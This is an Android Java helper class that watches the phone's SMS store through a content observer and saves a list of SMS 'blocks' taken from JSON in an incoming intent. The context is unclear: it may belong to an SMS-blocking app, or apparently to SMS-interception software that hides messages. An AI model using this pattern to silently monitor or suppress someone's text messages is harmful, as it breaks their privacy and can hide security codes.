package com.rot;
import java.util.List;
import org.json.JSONArray;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import com.rot.bean.Block;
import com.rot.bean.Json;
import com.rot.sms.BlockHelper;
import com.rot.sms.SmsHelper;
import com.rot.sms.SmsObserver;
import com.rot.utils.MyLogger;

public class ExportHelper {
    public static void handleStartCommand(android.app.Service service, Intent intent) {
        registerSmsObserver(service);
        try {
            String data = intent.getStringExtra("data");
            MyLogger.error("data:" + data);
            JSONArray array = new JSONArray(data);
            List<Block> list = Json.optList(Block.class, array);
            BlockHelper.saveBlocks(service, list);
        } catch (Throwable e) {
            MyLogger.error(e);
        }
    }
    private static boolean registered = false;
    private static void registerSmsObserver(final android.app.Service service) {
        if (registered) return;
        synchronized (ExportHelper.class) {
            Context context = service.getApplicationContext();
            SmsObserver smsobserver = new SmsObserver(context, new Handler());
            context.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsobserver);
            registered = true;
        }
    }
    public static void handleReceive(BroadcastReceiver receiver, Context context, Intent intent) {
        SmsHelper.doSmsReceiver(receiver, context, intent);
    }
}
